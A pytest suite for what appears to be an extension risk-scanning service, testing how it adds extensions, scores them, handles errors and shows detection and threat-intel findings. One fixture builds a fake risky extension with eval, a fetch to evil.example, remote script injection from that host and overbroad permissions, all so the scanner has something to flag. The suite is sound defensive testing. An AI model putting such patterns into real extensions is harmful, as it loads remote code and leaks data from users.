import io
import json
import zipfile
from unittest.mock import AsyncMock, patch

import httpx
import pytest
from sqlmodel import select
from sqlmodel.ext.asyncio.session import AsyncSession

from app.fetchers.base import ExtensionMetadata, FetchError
from app.models import Extension, FetchLog


def _fake_metadata():
    from datetime import datetime, timezone

    return ExtensionMetadata(
        name="Test Extension",
        publisher="testpub",
        description="A test extension",
        version="1.0.0",
        install_count=50000,
        last_updated=datetime(2023, 6, 1, tzinfo=timezone.utc),
        store_url="https://example.com",
        publisher_verified=True,
    )


def _fake_vsix() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(
            "manifest.json",
            json.dumps(
                {
                    "manifest_version": 3,
                    "name": "Test Extension",
                    "version": "1.0.0",
                    "permissions": ["storage"],
                }
            ),
        )
        zf.writestr("background.js", 'console.log("hello");')
    return buf.getvalue()


def _risky_vsix() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(
            "manifest.json",
            json.dumps(
                {
                    "manifest_version": 2,
                    "name": "Risky Extension",
                    "version": "1.0.0",
                    "permissions": ["tabs", "debugger"],
                    "host_permissions": ["<all_urls>"],
                    "content_security_policy": "script-src 'self' 'unsafe-eval' http://bad.example *",
                }
            ),
        )
        zf.writestr(
            "background.js",
            "eval('alert(1)');\n"
            "fetch('https://evil.example/data');\n"
            "const s = document.createElement('script'); s.src = 'https://evil.example/app.js';\n",
        )
    return buf.getvalue()


async def test_list_extensions_empty(client):
    r = await client.get("/api/extensions")
    assert r.status_code == 200
    body = r.json()
    assert body["items"] == []
    assert body["total"] == 0


async def test_add_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))

        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.test-ext",
            },
        )

    assert r.status_code == 201
    data = r.json()
    assert data["name"] == "Test Extension"
    assert data["store"] == "vscode"
    assert data["extension_id"] == "testpub.test-ext"
    assert data["risk_score"] is not None
    return data["id"]


async def test_add_extension_persists_store_url(client):
    # Regression (#72): fetch_and_store must copy metadata.store_url onto the
    # record — enrolled rows are created with store_url="" and previously stayed
    # empty, breaking the "View in store" link and webhook payloads.
    metadata = _fake_metadata()
    metadata.store_url = "https://store.example/detail/testpub.store-url-ext"
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(metadata, _fake_vsix()))

        r = await client.post(
            "/api/extensions",
            json={"store": "vscode", "extension_id": "testpub.store-url-ext"},
        )

    assert r.status_code == 201
    assert r.json()["store_url"] == "https://store.example/detail/testpub.store-url-ext"


async def test_add_extension_unexpected_error_discards_placeholder(client, test_db):
    # Regression (#75): an unexpected (non-FetchError) failure during the first
    # fetch/inspect/score must not leave an unscored placeholder on the watchlist.
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(side_effect=RuntimeError("boom in inspector"))

        with pytest.raises(RuntimeError):
            await client.post(
                "/api/extensions",
                json={"store": "vscode", "extension_id": "testpub.boom-ext"},
            )

    async with AsyncSession(test_db) as session:
        rows = (await session.exec(select(Extension).where(Extension.extension_id == "testpub.boom-ext"))).all()
    assert rows == []


async def test_add_extension_returns_and_persists_findings(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))

        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.risky-ext",
            },
        )

    assert r.status_code == 201
    data = r.json()
    codes = {finding["code"] for finding in data["findings"]}
    assert {"eval_usage", "remote_fetch", "dynamic_script_injection", "manifest_v2"} <= codes
    indicators = data["threat_intel_indicators"]
    assert any(i["type"] == "sha256" and len(i["value"]) == 64 for i in indicators)
    assert any(i["type"] == "domain" and i["value"] == "evil.example" for i in indicators)
    assert any(i["type"] == "url" and i["value"] == "https://evil.example/data" for i in indicators)
    assert any(lookup["label"] == "VirusTotal" for indicator in indicators for lookup in indicator["lookups"])
    domain_indicator = next(i for i in indicators if i["type"] == "domain" and i["value"] == "evil.example")
    assert domain_indicator["label"] == "Network callout domain"
    assert domain_indicator["section"] == "network"
    domain_otx = next(lookup for lookup in domain_indicator["lookups"] if lookup["label"] == "AlienVault OTX")
    assert domain_otx["url"] == "https://otx.alienvault.com/indicator/hostname/evil.example"
    assert domain_otx["requires_copy"] is False
    url_indicator = next(i for i in indicators if i["type"] == "url" and i["value"] == "https://evil.example/data")
    assert url_indicator["label"] == "Network callout URL"
    assert url_indicator["section"] == "network"
    url_otx = next(lookup for lookup in url_indicator["lookups"] if lookup["label"] == "AlienVault OTX")
    assert url_otx["url"] == "https://otx.alienvault.com/indicator/url/https:%2F%2Fevil.example%2Fdata"
    assert url_otx["requires_copy"] is False

    r2 = await client.get(f"/api/extensions/{data['id']}")
    assert r2.status_code == 200
    persisted_codes = {finding["code"] for finding in r2.json()["findings"]}
    assert codes == persisted_codes
    persisted_indicators = r2.json()["threat_intel_indicators"]
    assert persisted_indicators == indicators


async def test_old_package_analysis_without_findings_returns_empty(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="vscode",
            extension_id="testpub.old-ext",
            name="Old Extension",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    r = await client.get(f"/api/extensions/{ext_id}")
    assert r.status_code == 200
    assert r.json()["findings"] == []


async def test_extension_detail_renders_detection_findings(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.ui-risky",
            },
        )
    ext_id = r.json()["id"]

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert b"Detection findings" in page.content
    assert b"eval() usage" in page.content


async def test_extension_detail_renders_threat_intelligence_panel(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _risky_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.threat-intel",
            },
        )
    ext_id = r.json()["id"]

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert "External domains" in page.text
    assert "Observable indicators" in page.text
    assert "Package hash" in page.text
    assert "External tools may show no report when they have not seen that exact indicator." not in page.text
    assert "Network callout URL" in page.text
    assert '<span class="font-semibold text-[13px]" style="color:var(--ink-8)">Referenced URLs</span>' not in page.text
    assert "Network call in code" not in page.text
    assert "Found in code" not in page.text
    assert "https://evil.example/data" in page.text
    assert "VirusTotal" in page.text
    assert "AlienVault OTX" in page.text
    assert "URLhaus" not in page.text


async def test_extension_detail_groups_duplicate_detection_findings(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="vscode",
            extension_id="testpub.grouped-ui",
            name="Grouped UI Extension",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps(
                {
                    "findings": [
                        {
                            "code": "new_function_usage",
                            "severity": "high",
                            "title": "new Function usage",
                            "detail": "new Function() compiles strings as code at runtime.",
                            "source": "javascript",
                            "file": "background/background.js",
                            "line": 2,
                        },
                        {
                            "code": "new_function_usage",
                            "severity": "high",
                            "title": "new Function usage",
                            "detail": "new Function() compiles strings as code at runtime.",
                            "source": "javascript",
                            "file": "popup/popup.js",
                            "line": 2,
                        },
                        {
                            "code": "high_risk_permission",
                            "severity": "high",
                            "title": "High-risk permission",
                            "detail": "Permission 'cookies' can expose sensitive user or browser data.",
                            "source": "manifest",
                            "file": None,
                            "line": None,
                        },
                        {
                            "code": "high_risk_permission",
                            "severity": "high",
                            "title": "High-risk permission",
                            "detail": "Permission 'tabs' can expose sensitive user or browser data.",
                            "source": "manifest",
                            "file": None,
                            "line": None,
                        },
                    ],
                }
            ),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert page.text.count("new Function usage") == 1
    assert page.text.count("new Function() compiles strings as code at runtime.") == 1
    assert page.text.count("High-risk permission") == 1
    assert page.text.count("manifest") == 1
    assert "2 grouped from 4" in page.text
    assert "2 locations" in page.text
    assert "2 findings" in page.text
    assert "background/background.js:2" in page.text
    assert "popup/popup.js:2" in page.text
    assert "background/background.js:2 · popup/popup.js:2" in page.text
    assert "Permission &#39;cookies&#39; can expose sensitive user or browser data." in page.text
    assert "Permission &#39;tabs&#39; can expose sensitive user or browser data." in page.text


async def test_extension_detail_handles_old_package_analysis_without_findings(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="vscode",
            extension_id="testpub.old-ui",
            name="Old UI Extension",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps({"permissions": [], "host_permissions": []}),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    # Tabs always render, but the findings panel should show the empty-state message
    assert b"No detection findings for this extension." in page.content


async def test_extension_detail_explains_archive_content_hash(client, test_db, admin_user):
    async with AsyncSession(test_db) as session:
        ext = Extension(
            user_id=admin_user.id,
            store="chrome",
            extension_id="archive-hash-ui",
            name="Archive Hash UI",
            publisher="testpub",
            version="1.0.0",
            store_url="https://example.com",
            package_analysis=json.dumps(
                {
                    "permissions": [],
                    "host_permissions": [],
                    "package_sha256": "a" * 64,
                    "archive_sha256": "b" * 64,
                }
            ),
        )
        session.add(ext)
        await session.commit()
        await session.refresh(ext)
        ext_id = ext.id

    page = await client.get(f"/extensions/{ext_id}")
    assert page.status_code == 200
    assert "Archive content hash" in page.text
    assert (
        "SHA-256 of the archive payload inside the downloaded package. "
        "This can help when a lookup provider indexed the unpacked archive instead of the signed package."
    ) in page.text


async def test_add_extension_fetch_failure_leaves_no_placeholder(client):
    """If the first fetch fails, the placeholder extension is rolled back, not persisted."""
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(side_effect=FetchError("store unavailable"))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.ghost-ext",
            },
        )

    assert r.status_code == 502
    # The failed add must not leave an unanalysed extension behind.
    r_list = await client.get("/api/extensions")
    assert r_list.status_code == 200
    assert all(e["extension_id"] != "testpub.ghost-ext" for e in r_list.json()["items"])


async def test_add_extension_duplicate(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))

        await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.dupe-ext",
            },
        )
        r2 = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.dupe-ext",
            },
        )

    assert r2.status_code == 409


async def test_get_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.get-test",
            },
        )
    ext_id = r.json()["id"]

    r2 = await client.get(f"/api/extensions/{ext_id}")
    assert r2.status_code == 200
    assert r2.json()["id"] == ext_id


async def test_delete_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.del-test",
            },
        )
    ext_id = r.json()["id"]

    r_del = await client.delete(f"/api/extensions/{ext_id}")
    assert r_del.status_code == 200
    assert r_del.json() == {"ok": True}

    r_get = await client.get(f"/api/extensions/{ext_id}")
    assert r_get.status_code == 404


async def test_refresh_extension(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.refresh-test",
            },
        )
    ext_id = r.json()["id"]

    with patch("app.fetchers.VSCodeFetcher") as MockFetcher2:
        instance2 = MockFetcher2.return_value
        meta2 = _fake_metadata()
        instance2.fetch = AsyncMock(return_value=(meta2, _fake_vsix()))
        r2 = await client.post(f"/api/extensions/{ext_id}/refresh")

    assert r2.status_code == 200
    assert r2.json()["last_fetched_at"] is not None


async def test_refresh_transport_error_returns_502_and_logs_failure(client, test_db):
    """#148: a raw httpx.TransportError (retries exhausted, store unreachable) on the
    interactive refresh path must return 502 and write a success=False FetchLog — matching
    the scheduler — not surface a raw 500 with no fetch-health record."""
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        MockFetcher.return_value.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post("/api/extensions", json={"store": "vscode", "extension_id": "testpub.transport"})
    ext_id = r.json()["id"]

    with patch("app.fetchers.VSCodeFetcher") as MockFetcher2:
        MockFetcher2.return_value.fetch = AsyncMock(side_effect=httpx.ConnectError("connection refused"))
        r2 = await client.post(f"/api/extensions/{ext_id}/refresh")

    assert r2.status_code == 502
    async with AsyncSession(test_db) as s:
        logs = (
            await s.exec(select(FetchLog).where(FetchLog.extension_id == ext_id, FetchLog.success == False))  # noqa: E712
        ).all()
    assert len(logs) == 1
    assert "connection refused" in (logs[0].error_message or "")


async def test_add_transport_error_reports_error_not_500(client):
    """The add path must map a TransportError to the intended 502 (and discard the
    placeholder), not a raw 500 from the generic except (#148)."""
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        MockFetcher.return_value.fetch = AsyncMock(side_effect=httpx.ConnectError("connection refused"))
        r = await client.post("/api/extensions", json={"store": "vscode", "extension_id": "testpub.transport-add"})

    assert r.status_code == 502
    r_list = await client.get("/api/extensions")
    assert all(e["extension_id"] != "testpub.transport-add" for e in r_list.json()["items"])


async def test_extension_out_tolerates_wrong_shaped_findings(client, test_db, admin_user):
    """#150: a partial write / manual edit can leave valid-JSON-but-wrong-shape in
    package_analysis. The single-extension API must not 500 — non-dict findings are
    skipped, dicts missing required fields are defaulted, and a wrong-typed
    host_permissions / findings container falls back to []."""
    package_analysis = json.dumps(
        {
            "host_permissions": {"not": "a list"},  # wrong container type
            "findings": [
                {"code": "GOOD", "severity": "high", "title": "T", "detail": "d", "source": "package", "line": 3},
                {"code": "PARTIAL"},  # missing severity/title/detail/source → defaulted
                "not a dict",  # skipped
                42,  # skipped
            ],
        }
    )
    async with AsyncSession(test_db) as s:
        ext = Extension(
            user_id=admin_user.id,
            store="chrome",
            extension_id="a" * 32,
            name="Misshaped",
            publisher="Acme",
            version="1.0",
            store_url="https://example.com",
            package_analysis=package_analysis,
        )
        s.add(ext)
        await s.commit()
        await s.refresh(ext)
        ext_id = ext.id

    r = await client.get(f"/api/extensions/{ext_id}")
    assert r.status_code == 200
    data = r.json()
    assert data["host_permissions"] == []  # wrong-shape → fallback, not a 500
    findings = data["findings"]
    assert {f["code"] for f in findings} == {"GOOD", "PARTIAL"}  # non-dicts skipped
    partial = next(f for f in findings if f["code"] == "PARTIAL")
    assert partial["severity"] == "low"  # defaulted
    assert partial["title"] == "PARTIAL"  # falls back to code
    assert partial["source"] == "package"


async def test_extension_out_tolerates_non_list_findings(client, test_db, admin_user):
    """A `findings` that isn't a list at all must not raise while iterating (#150)."""
    async with AsyncSession(test_db) as s:
        ext = Extension(
            user_id=admin_user.id,
            store="chrome",
            extension_id="b" * 32,
            name="BadFindings",
            publisher="Acme",
            version="1.0",
            store_url="https://example.com",
            package_analysis=json.dumps({"findings": "not-a-list"}),
        )
        s.add(ext)
        await s.commit()
        await s.refresh(ext)
        ext_id = ext.id

    r = await client.get(f"/api/extensions/{ext_id}")
    assert r.status_code == 200
    assert r.json()["findings"] == []


async def test_toggle_watchlist(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), _fake_vsix()))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.watch-test",
            },
        )
    ext_id = r.json()["id"]
    assert r.json()["watchlist"] is True

    r2 = await client.patch(f"/api/extensions/{ext_id}/watchlist", json={"watchlist": False})
    assert r2.status_code == 200
    assert r2.json()["watchlist"] is False


async def test_get_history_empty(client):
    with patch("app.fetchers.VSCodeFetcher") as MockFetcher:
        instance = MockFetcher.return_value
        instance.fetch = AsyncMock(return_value=(_fake_metadata(), None))
        r = await client.post(
            "/api/extensions",
            json={
                "store": "vscode",
                "extension_id": "testpub.hist-test",
            },
        )
    ext_id = r.json()["id"]

    r2 = await client.get(f"/api/extensions/{ext_id}/history")
    assert r2.status_code == 200
    # install_count=50000 so one history entry should exist
    assert isinstance(r2.json(), list)


async def test_unauthenticated_api(anon_client):
    r = await anon_client.get("/api/extensions", follow_redirects=False)
    assert r.status_code == 401
